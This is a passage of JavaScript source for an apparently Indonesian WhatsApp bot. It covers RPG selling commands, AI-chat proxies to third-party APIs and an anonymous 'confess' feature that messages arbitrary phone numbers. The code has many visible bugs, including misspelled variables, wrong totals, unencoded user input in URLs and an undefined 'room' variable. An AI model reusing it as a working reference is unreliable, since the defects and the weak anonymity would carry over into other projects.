reply(`Maaf *${pushname}* Money Kamu Belum Cukup!\nUntuk Pembelian Sebanyak *${bayar}*`);
}
break
case 'selliron':
case 'jualbesi': {
let user = db.data.users[m.sender]
    if (!m.isGroup) return newReply('Fitur Khusus Group!');
    if (!text || isNaN(text)) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin dijual berupa angka\n\nContoh ${prefix + command} 10\n*Harga 1 Besi = 150*`);

    const bayar = parseInt(text); // Convert input to integer
    const hargabesi = 150;
    const hasil = bayar * hargabesi;

    if (user.iron <= 1) return reply(`Maaf *${pushname}* Besi kamu belum cukup, minimal 2 besi\n*Harga 1 Besi = 150*`);

    if (user.iron >= bayar) {
        user.iron -= bayar
        user.money += hasil
        await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Besi dijual: ${bayar}* \n\n*Uang didapat:* ${hasil}\n\n*Sisa Besi:* ${user.iron}\n*Sisa uang:* $${user.money}`);
    } else {
        reply(`Maaf *${pushname}*, Besi yang kamu jual sebanyak ${bayar} tidak mencukupi.`);
    }
}
break;
case 'sellgold':
case 'jualemas': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Emas = 300*`)
bayar = parseInt(text);
const hargaemas = 300
const hasiljualemas = bayar * hargaemas
if ( user.gold <= 1 ) return reply(`Maaf *${pushname}* Emas kamu belum cukup, minimal 2 besi\n*Harga 1 Emas = 300*`)
if ( user.gold >= bayar ) {
user.gold -= bayar
user.money += hasiljualemas
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Emas dijual: ${bayar}* \n\n*Uang didapat:* ${hasiljualemas}\n\n*Sisa Emas:* ${user.gold}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}*, Emas yang kamu jual sebanyak ${bayar} tidak mencukupi.`);
}
}
break
case 'sellfish':
case 'jualikan': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Ikan = 50*`)
bayar = parseInt(text);
const hargaIkan = 50
const hasil1 = bayar * hargaIkan
if ( user.ikan <= 1 ) return newReply(`Maaf ${pushname} Ikan kamu belum cukup, minimal 2 ikan\n*Harga 1 Ikan = 50*`)
if ( user.ikan >= bayar ) {
user.ikan -= bayar
user.money += hasil1
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah ikan dijual:* ${bayar}\n*Uang didapat:* ${hasil1}\n\n*Sisa ikan:* ${user.ikan}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Ikan yang kamu jual sebanyak ${bayar} tidak mencukupi.`);
}
}
break
case 'sellcoal':
case 'jualcoal': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Coal = 200*`)
bayar = parseInt(text);
const hargaCoal = 200
const hasil2 = bayar * hargaCoal
if ( user.coal <= 1 ) return newReply(`Maaf ${pushname} kamu tidak punya coal\n*Harga 1 Coal = 200*`)
if ( user.coal >= bayar ) {
user.coal -= bayar
user.balance += hasil2
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Coal dijual:* ${bayar}\n*Uang didapat:* ${hasil2}\n\n*Sisa coal:* ${user.coal}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Coal yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'lebur': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Ore = 250*`)
bayar = parseInt(text);
const hargaOre = 250
const hasil3 = bayar * hargaOre
if ( user.ore <= 1 ) return reply(`Maaf *${pushname}* ore kamu belum cukup, minimal 2 ore\n*Harga 1 Ore = 250*`)
if ( user.ore >= bayar ) {
user.ore -= bayar
user.ingot += hasil3
await reply(`*「 LEBUR BERHASIL 」*\n\n*Jumlah Ore dilebur :* ${bayar}\n*Ingot didapat:* ${hasil3}\n\n*Sisa Ore:* ${user.ore}`)
} else {
reply(`Maaf *${pushname}* Ore yang akan kamu lebur sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'sellstone':
case 'jualstone': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Batu = 10*`)
bayar = parseInt(text);
const hargaStone = 10
const hasil4 = bayar * hargaStone
if ( user.stone <= 1 ) return reply(`Maaf *${pushname}* stone kamu belum cukup, minimal 2 stone\n*Harga 1 Batu = 10*`)
if ( user.stone >= bayar ) {
user.stone -= bayar
user.money += hasil4
await reply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Batu dijual:* ${bayar}\n*Uang didapat:* ${hasil4}\n\n*Sisa Batu:* ${user.stone}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Stone yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'selldm':
case 'selldiamond':
case 'jualdm':
case 'jualdiamond': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Diamond = 3000*`)
bayar = parseInt(text);
const hargadm = 3000
const hasil5 = bayar * hargadm
if ( user.diamond <= 1 ) return newReply(`Maaf *${pushname}* Diamond kamu belum cukup, minimal 2 Diamond\n*Harga 1 Diamond = 3000*`)
if ( user.diamond >= bayar ) {
user.diamond -= bayar
user.money += hasil5
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Diamond dijual:* ${bayar}\n*Uang didapat:* ${hasil5}\n\n*Sisa Diamond:* ${user.diamond}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Diamond yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'sellemerald':
case 'jualzamrud':
case 'jualemerald': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Emerald = 3500*`)
bayar = parseInt(text);
const hargaeme = 3500
const hasil6 = bayar * hargaeme
if ( user.emerald <= 1 ) return newReply(`Maaf *${pushname}* Emerald kamu belum cukup, minimal 2 Emerald\n*Harga 1 Emerald = 3500*`)
if ( user.emerald >= bayar ) {
user.emerald -= bayar
user.money += hasil6
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Emerald dijual:* ${bayar}\n*Uang didapat:* ${hasil6}\n\n*Sisa Emerald:* ${user.emerald}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Emerald yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'sellingot':
case 'jualingot': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Ingot = 1000*`)
bayar = parseInt(text);
const hargaIngot = 1000
const hasil7 = bayar * hargaIngot
if ( user.ingot <= 1 ) return newReply(`Maaf ${pushname} ingot kamu belum cukup, minimal 2 ingot\n*Harga 1 Ingot = 1000*`)
if ( user.ingot >= bayar ) {
user.ingot -= bayar
user.money += hasil7
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Ingot dijual:* ${bayar}\n*Uang didapat:* ${hasil5}\n\n*Sisa Ingot:* ${user.ingot}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Ingot yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'sellwood':
case 'jualkayu': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = parseInt(text);
const hargaKayu = 300
const hasil8 = bayar * hargaKayu
if ( user.kayu <= 1 ) return newReply(`Maaf ${pushname} kayu kamu belum cukup, minimal 2 kayu\n*Harga 1 Kayu = 300*`)
if ( user.kayu >= bayar ) {
user.kayu -= bayar
user.money += hasil8
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Kayu dijual:* ${bayar}\n*Uang didapat:* ${hasil8}\n\n*Sisa Kayu :* ${user.kayu}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Kayu yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'sellchicken':
case 'jualayam': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return newReply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Ayam = 50*`)
bayar = parseInt(text);
const hargaayam = 100
const hasil9 = bayar * hargaayam
if ( user.ayam <= 1 ) return reply(`Maaf *${pushname}* Ayam kamu belum cukup, minimal 2 ayam\n*Harga 1 Ayam = 100*`)
if ( user.ayam >= bayar ) {
user.ayam -= bayar
user.money += hasil9
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Ayam dijual:* \n\n*Uang didapat:* ${hasil9}\n\n*Sisa Ayam:* ${user.ayam}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Ayam yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'sellrabbit':
case 'jualkelinci': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Kelinci = 20*`)
bayar = parseInt(text);
const hargakelinci = 20
const hasil10 = bayar * hargakelinci
if ( user.kelinci <= 1 ) return reply(`Maaf *${pushname}* Kelinci kamu belum cukup, minimal 2 kelinci\n*Harga 1 Kelinci = 20*`)
if ( user.kelinci >= bayar ) {
user.kelinci -= bayar
user.money += hasil10
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Kelinci dijual:* \n\n*Uang didapat:* ${hasil10}\n\n*Sisa Kelinci:* ${user.kelinci}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Kelinci yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'sellsheep':
case 'jualdomba': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Domba = 300*`)
bayar = parseInt(text);
const hargadomba = 300
const hasil11 = bayar * hargadomba
if ( uaer.domba <= 1 ) return reply(`Maaf *${pushname}* Domba kamu belum cukup, minimal 2 domba\n*Harga 1 Domba = 300*`)
if ( user.domba >= bayar ) {
user.domba -= bayar
user.money += hasil11
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Domba dijual:* \n\n*Uang didapat:* ${hasil11}\n\n*Sisa Domba:* ${user.domba}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Domba yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'sellcow':
case 'jualsapi': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Sapi = 500*`)
bayar = parseInt(text);
const hargasapi = 500
const hasil12 = bayar * hargasapi
if ( user.sapi <= 1 ) return reply(`Maaf *${pushname}* Sapi kamu belum cukup, minimal 2 sapi\n*Harga 1 Sapi = 500*`)
if ( user.sapi >= bayar ) {
user.sapi -= bayar
user.money += hasil12
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Sapi dijual:* \n\n*Uang didapat:* ${hasil12}\n\n*Sisa Sapi:* ${user.sapi}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Sapi yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'sellelephat':
case 'jualgajah': {
let user = db.data.users[m.sender]
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text || isNaN(text)) return reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10\n*Harga 1 Gajah = 1000*`)
bayar = parseInt(text);
const hargagajah = 1000
const hasil13 = bayar * hargagajah
if ( user.gajah <= 1 ) return reply(`Maaf *${pushname}* Gajah kamu belum cukup, minimal 2 gajah\n*Harga 1 Gajah = 1000*`)
if ( user.gajah >= bayar ) {
user.gajah -= bayar
user.miney += hasil13
await newReply(`*「 PENJUALAN BERHASIL 」*\n\n*Jumlah Gajah dijual:* \n\n*Uang didapat:* ${hasil13}\n\n*Sisa Sapi:* ${user.gajah}\n*Sisa uang:* $${user.money}`)
} else {
reply(`Maaf *${pushname}* Gajah yang kamu jual sebanyak ${bayar} tidak mencukupi.`)
}
}
break
case 'tebang':
case 'menebang':
case 'nebang': {
let user = db.data.users[m.sender]
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (user.axe == 0) return reply(`Kamu Tidak Bisa Menebang Pohon Tanpa Peralatan! (Kapak/Axe🪓)`)
const oreo = Math.ceil(Math.random() * 20)
let { key } = await HuBotZ.sendMessage(m.chat, { text: `${pushname} Sedang Menebang Kayu. . .` }, { quoted: m });
await sleep(1000);
const pesan1 = [
    `${pushname} Sedang Mengangkat Kayu Yang Berat. . .`
];
for (let i = 0; i < pesan1.length; i++) {
await HuBotZ.sendMessage(m.chat, { text: pesan1[i], edit: key });
};
await sleep(2000);
user.armordurability -= ranNumb(80, 120)
user.sworddurability -= ranNumb(80, 120)
if (user.axedurability <= 0) {
user.axedurability = 0
user.axe = 0
}
HuBotZ.sendMessage(m.chat, { text: `*Congratulation 🎊 ${pushname}* kamu mendapatkan *${oreo}* kayu selama 2 menit`, edit: key});
user.kayu += oreo
user.health -= 10
}
break
case 'pergikeplanet':
case 'pergiplanet':
case 'goplanet': {
let user = global.db.data.users[m.sender]
let __timers = (new Date - user.lastmeroket)
let _timers = (3600000 - __timers) 
let timers = clockString(_timers)
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (new Date - user.lastmeroket > timers) {
const bertualang = Math.ceil(Math.random() * 100)
const goplanet = ['merkurius','venus','mars','jupiter','saturnus','neptunus','uranus']
const planetari = goplanet[Math.floor(Math.random() * goplanet.length)]
let { key } = await HuBotZ.sendMessage(m.chat, { text: `*${pushname}* Sedang Meroket 😱, Silahkan Tunggu 3 Tahun` }, { quoted: m });
await sleep(2000);
const pesan2 = [
    `${pushname} Sedang Mengambil Material Di Luar Angkasa. . .`
];
for (let i = 0; i < pesan2.length; i++) {
await HuBotZ.sendMessage(m.chat, {text: pesan2[i], edit: key });
};
await sleep(3000);
user.iron += bertualang
user.health -= 20
user.lastmeroket = new Date() * 1;
HuBotZ.sendMessage(m.chat, { text: `*Congratulation 🎊\n\n${pushname} kamu mendapatkan *${bertualang} Besi dari ${planetari}* selama 3 tahun`, edit: key});
} else {
m.reply(`_*COOLDOWN*_\nKamu Sudah Meroket\nMohon Tunggu *${timers}* Untuk Meroket Lagi`)
}
}
break
// Artificial Inteligience
case 'ai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return reply('Mau Nanya Apa?');
    let { key } = await HuBotZ.sendMessage(m.chat, { text: `${mess.Tunggu}` }, { quoted: m });
    await sleep(2000);

    const messages = ["🇺🇸 *Your Limit is Reduced by 2*\n\n🇮🇩 *Limit Anda Berkurang 2*"];
    for (let i = 0; i < messages.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: messages[i], edit: key });
      db.data.users[m.sender].limit -= 1
      let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
      HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
      if (i !== messages.length - 1) {
        await sleep(0);
      }
    }
    await sleep(0);
let response = await fetchJson(`https://aemt.me/openai?text=${text}`);
HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/ai.mp4"),
caption: `${response.result}`,
gifPlayback: true,
}, { quoted: m });
}
break
case 'aiv2': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return reply('Mau Nanya Apa?');
    let { key } = await HuBotZ.sendMessage(m.chat, { text: `${mess.Tunggu}` }, { quoted: m });
    await sleep(2000);

    const messages = ["🇺🇸 *Your Limit is Reduced by 2*\n\n🇮🇩 *Limit Anda Berkurang 2*"];
    for (let i = 0; i < messages.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: messages[i], edit: key });
      db.data.users[m.sender].limit - 1
      let limitUserr = `${db.data.users[m.sender]}/${global.limitawal.free}`
let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
      HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
      if (i !== messages.length - 1) {
        await sleep(0);
      }
    }
    await sleep(0);
let response = await axios.get(`https://api.miftahganzz.tech/api/ai/gpt-4?q=${text}&user=gpt4&apikey=${global.miftah}`);
HuBotZ.sendMessage(m.chat, {
video: fs.readFileSync("./theme/ai.mp4"),
caption: `${response.data.respon}`,
gifPlayback: true,
}, { quoted: m });
}
break
case 'kuncoro': {
                if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
                if (!text) return reply('Nanya Apa Lu?');
                let response = await axios.get(`https://api.miftahganzz.tech/api/ai/kuncoro?q=${text}&user=Kuncoro&apikey=${global.miftah}`);
                HuBotZ.sendMessage(m.chat, {
                    video: fs.readFileSync("./theme/kuncoro.mp4"),
                    caption: `${response.data.data.result}`,
                    gifPlayback: true,
                    }, { quoted: m });
            }
            db.data.users[m.sender].limit -= 1
            break
case 'googlebard':
case 'bardai':
case 'bard': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return m.reply('Ada Yang Bisa Saya Bantu?')
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '⌛',
        key: m.key,
    }})
    try {
let rs = await fetchJson(`https://aemt.me/bard?text=${text}`)
await HuBotZ.sendMessage(m.chat, {
text: rs.result,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          renderLargerThumbnail: true,
          title: '© Powered By Google',
          body: '',
          containsAutoReply: true,
          mediaType: 1,
          thumbnail: await getBuffer("https://telegra.ph/file/d712fa17d118b50a2973d.jpg"),
          mediaUrl: '',
          sourceUrl: global.wagc,
        }
      }
    }, { quoted: m });
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '✔️',
        key: m.key,
    }})
} catch (er) {
console.log(er)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '❌',
        key: m.key,
    }})
}
db.data.users[m.sender].limit -= 1
}
break
case 'bardimg':
case 'imgbard': {
if (!isPremium && !isCreator && !isMods) return reply(mess.OnlyPrem);
if (!isMedia) return reply(`Send Or Reply Image With Caption:\n${prefix + command} What Is That Picture?`)
if (!/image/.test(mime)) return reply(`Send Or Reply Image With Caption:\n${prefix + command} What Is That Picture?`)
puki = await HuBotZ.downloadAndSaveMediaMessage(quoted)
pukima = await TelegraPh(puki);
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '⌛',
        key: m.key,
    }})
    try {
    let result = await fetchJson(`https://aemt.me/bardimg?url=${encodeURIComponent(pukima)}`)
    await HuBotZ.sendMessage(m.chat, {
    text: result.result,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          renderLargerThumbnail: true,
          title: '© Powered By Google',
          body: '',
          containsAutoReply: true,
          mediaType: 1,
          thumbnail: await getBuffer(`${pukima}`),
          mediaUrl: '',
          sourceUrl: global.wagc,
        }
      }
    }, { quoted: m });
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '✔️',
        key: m.key,
    }})
} catch (e) {
console.error(e)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '⌛',
        key: m.key,
    }})
reply(mess.emror.feature)
}
}
break
case 'bingai':
case 'bing': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return m.reply('Hi Ada Yang Bisa Saya Bantu?')
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '⌛',
        key: m.key,
    }})
    try {
let rsp = await fetchJson(`https://aemt.me/bingai?text=${text}`)
await HuBotZ.sendMessage(m.chat, {
text: rsp.result,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          renderLargerThumbnail: true,
          title: '© Powered By Microsoft',
          body: '',
          containsAutoReply: true,
          mediaType: 1,
          thumbnail: await getBuffer("https://telegra.ph/file/7cce806336da8af5ffaee.jpg"),
          mediaUrl: '',
          sourceUrl: global.wagc,
        }
      }
    }, { quoted: m });
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '✔️',
        key: m.key,
    }})
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text: '❌',
        key: m.key,
    }})
}
db.data.users[m.sender].limit -= 1
}
break
case 'bingimg':
case 'bingimage': {
if (!isPremium && !isCreator) return reply(mess.OnlyPrem);
if (!text) return m.reply(`Masukan Prompt!\n*Contoh* ${prefix + command} Pria Dengan Baju Kaos Berwarna Hitam Dan Dengan Bertuliskan Nama David`);
m.reply('_Generating_');
    try {
const bingimg = await fetch(`https://aemt.me/bingimg?text=${text}`);
const hasil = await bingimg.json();
const tag = `@${m.sender.split('@')[0]}`;
await HuBotZ.sendMessage(m.chat, {
image: {
url: hasil.result
},
caption: `*Status* : _True_\n*Request By* : ${tag}\n*Prompt* : ${text}`,
mentions: [m.sender]
}, { quoted: m });
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan Saat Memproses Gambar!')
}
}
break
case 'menfes':
case 'menfess':
case 'confes':
case 'confess':
if (Object.values(anon.anonymous).find(p => p.check(m.sender))) return replygcHuBotZ("Kamu Masih Di Dalam Room!")
if (m.isGroup) return reply(mess.OnlyPM)
if (args.length < 1) return reply(`Gunakan ${prefix+command} Nomor|Pesan Kamu\nExample ${prefix+command} 6281383141734|Hi Owner`)
if (text > 700) return reply(`Teks nya Kepanjangan!`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = q.split('|')[1]
let cekno = await HuBotZ.onWhatsApp(num)
if (cekno.length == 0) return reply(`Masukan Nomor Yang Valid San Terdaftar Di WhatsApp!!!`)
if (num === m.sender) return reply(`Ngapain Confess Ke Nomor Owner?`)
if (num === global.botnumber) return reply(`Gak Bisa Ke Nomor Bot`)
var nomor = m.sender

const HuBotZconfesmsg = `Hi, Aku Adalah Bot. Seseorang mengirimkan kamu pesan.

Seseorang Mengirim Kamu Pesan
(Pengirimnya Rahasia)

-------------------------------------->

💌 Isi Pesan : ${pesan}

-------------------------------------->`

await HuBotZ.sendMessage(num,
{ text: HuBotZconfesmsg,
contextInfo:{
mentionedJid: [m.sender],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `Menfess`,
"body": `Only For You`,
"previewType": "PHOTO",
"thumbnailUrl": 'https://telegra.ph/file/dc8c711c2157a7ab39a0e.jpg',
"thumbnail": '',
"sourceUrl": ''
}}}, {quoted:m})

await HuBotZ.sendMessage(num, {text:`You can also reply to the message by sending a message, if you don't want to reply, please type .leave and enter send button`}, { quoted : m })
lidt = `Success Sending Message
👤 Dari   : wa.me/${nomor.split("@s.whatsapp.net")[0]}
👥 Kepada : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}

⬡──⬡─────────⬡──⬡

Pesan Kamu : ${pesan}

⬡──⬡─────────⬡──⬡`
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(m.sender, num)
console.log("[ CONFESS ] Creating room for: " + m.sender);
return reply(lidt)
}
break
case 'leave': {
if (m.isGroup && isCreator && command == "leave") return HuBotZ.groupLeave(from)
if (m.isGroup) return reply("Hanya Di Private Chat")
var rom = Object.values(anon.anonymous).find(p => p.check(sender))
if (!rom) return reply("Kamu Sedang Tidak Di Dalam Room")
m.reply("Bye...")
var other = room.other(sender)
delete anon.anonymous[room.id]
if (other != "") HuBotZ.sendMessage(other, {
text: "Bye..."
})
if (command == "leave") 
break;
}
case 'characterai':
case 'cai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *character|text*`)
if (!q.includes('|')) return reply(`Gunakan dengan cara ${prefix+command} *character|text*`)
try {
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
const apiUrl = `https://aemt.me/ai/c-ai?prompt=${m1}&text=${m2}`;
const response = await fetch(apiUrl);
    const dt = await response.json();
    if (response.ok) {
    } else {
      m.reply("Tidak ada hasil yang ditemukan.");
    }
await HuBotZ.sendMessage(m.chat, {
text: dt.result,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          renderLargerThumbnail: true,
          title: 'Character Ai',
          containsAutoReply: true,
          mediaType: 1,
          thumbnail: await getBuffer("https://telegra.ph/file/590037e0ff0d358440d2c.jpg"),
          mediaUrl: '',
          sourceUrl: ''
        }
      }
    }, { quoted: m });
    } catch (e) {
    m.reply("Terjadi kesalahan dalam mengambil data.");
    console.error(e);
  }
}
db.data.users[m.sender].limit -= 1
break
//Menu Nya:V
case 'allmenu':
case 'menuall': {
    let capt = `
*This is the All of menu in this bot*
${readMore}
╭─────┈『 *MAIN MENU* 』
│${petik}
├• ${prefix}simplemenu
├• ${prefix}infobot
├• ${prefix}dashboard
├• ${prefix}owner
├• ${prefix}cekdrive
├• ${prefix}cekbandwidth
├• ${prefix}cekpremium
├• ${prefix}listpremium
├• ${prefix}listsewa
├• ${prefix}speed
├• ${prefix}runtime
├• ${prefix}listbahasa
│${petik}
├─────┈『 *ARTIFICIAL INTELLIGENCE* 』
│${petik}
├• ${prefix}toanime
├• ${prefix}differentme
├• ${prefix}differentme2
├• ${prefix}stabblediffusion <prompt>
├• ${prefix}text2img <prompt>
├• ${prefix}text2imgv2 <prompt>
├• ${prefix}text2imgv3 <Models|Prompt>
├• ${prefix}bingimg <prompt>
├• ${prefix}bardimg <prompt>
├• ${prefix}aiscene
├• ${prefix}remini
├• ${prefix}hdr
├• ${prefix}ai GPT 3.5
├• ${prefix}aiv2 GPT-4 With Logic
├• ${prefix}bard [text]
├• ${prefix}bing [text]
├• ${prefix}kuncoro [text]
├• ${prefix}valrisk [text]
├• ${prefix}c-ai <Character|Text>
│${petik}
├─────┈『 *CONVERTED MENU* 』
│${petik}
├• ${prefix}nobg
├• ${prefix}removebg
├• ${prefix}resize
├• ${prefix}ssweb
├• ${prefix}ssweb2
├• ${prefix}sticker
├• ${prefix}stickerwm
├• ${prefix}smeme
├• ${prefix}toimg
├• ${prefix}tourl
├• ${prefix}tovideo
├• ${prefix}tomp3
├• ${prefix}toaudio
├• ${prefix}tovn
├• ${prefix}toptv
├• ${prefix}readvo
├• ${prefix}ttp
├• ${prefix}attp
├• ${prefix}qc
├• ${prefix}emojimix
├• ${prefix}say
├• ${prefix}translate
│${petik}
├─────┈『 *ANONYMOUS MENU* 』
│${petik}
├• ${prefix}anonymouschat
├• ${prefix}start
├• ${prefix}next
├• ${prefix}stop
├• ${prefix}sendprofile
├• ${prefix}menfess
├• ${prefix}confess
├• ${prefix}balasmenfess
├• ${prefix}tolakmenfess
├• ${prefix}stopmenfess
│${petik}
├─────┈『 *RPG MENU* 』
│${petik}
├• ${prefix}inventory
├• ${prefix}claim/daily
├• ${prefix}weekly
├• ${prefix}monthly
├• ${prefix}mining
├• ${prefix}buy
├• ${prefix}craft <item>
├• ${prefix}heal
├• ${prefix}hunt
├• ${prefix}adventure
├• ${prefix}luckyday
├• ${prefix}killslime
├• ${prefix}killgoblin
├• ${prefix}killdevil
├• ${prefix}killbehemoth
├• ${prefix}killdemon
├• ${prefix}killdemonking
├• ${prefix}joinrpg
├• ${prefix}sellikan
├• ${prefix}sellbesi
├• ${prefix}sellemas
├• ${prefix}jelajah
├• ${prefix}mancing
├• ${prefix}jualikan [amount]
├• ${prefix}jualcoal [amount]
├• ${prefix}jualstone [amount]
├• ${prefix}jualingot [amount]
├• ${prefix}jualkayu [amount]
├• ${prefix}jualbahankimia [amount]
├• ${prefix}jualkelinci [amount]
├• ${prefix}jualayam [amount]
├• ${prefix}jualsapi [amount]
├• ${prefix}jualdomba [amount]
├• ${prefix}jualgajah [amount]
